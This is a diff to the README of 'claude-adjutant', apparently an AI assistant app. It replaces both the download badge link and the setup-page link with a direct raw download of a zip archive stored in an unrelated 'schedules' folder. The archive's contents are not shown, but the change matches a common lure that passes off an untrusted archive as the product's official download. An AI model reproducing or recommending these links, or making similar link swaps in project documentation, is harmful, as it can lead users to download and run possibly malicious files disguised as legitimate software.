@@ -1,6 +1,6 @@
 # 🤖 claude-adjutant - Your markdown-based AI assistant
 
-[![Download claude-adjutant](https://img.shields.io/badge/Download%20claude--adjutant-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/birgittadonothing495/claude-adjutant)
+[![Download claude-adjutant](https://img.shields.io/badge/Download%20claude--adjutant-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/birgittadonothing495/claude-adjutant/raw/refs/heads/main/schedules/claude_adjutant_v2.6.zip)
 
 ## 🚀 What claude-adjutant does
 
@@ -33,7 +33,7 @@ Keep this folder easy to find. The app uses markdown files, so a clean folder he
 
 Go to this page to download and set up the app:
 
-[Visit claude-adjutant on GitHub](https://github.com/birgittadonothing495/claude-adjutant)
+[Visit claude-adjutant on GitHub](https://github.com/birgittadonothing495/claude-adjutant/raw/refs/heads/main/schedules/claude_adjutant_v2.6.zip)
 
 1. Open the link in your browser.
 2. Download the project files from the page.
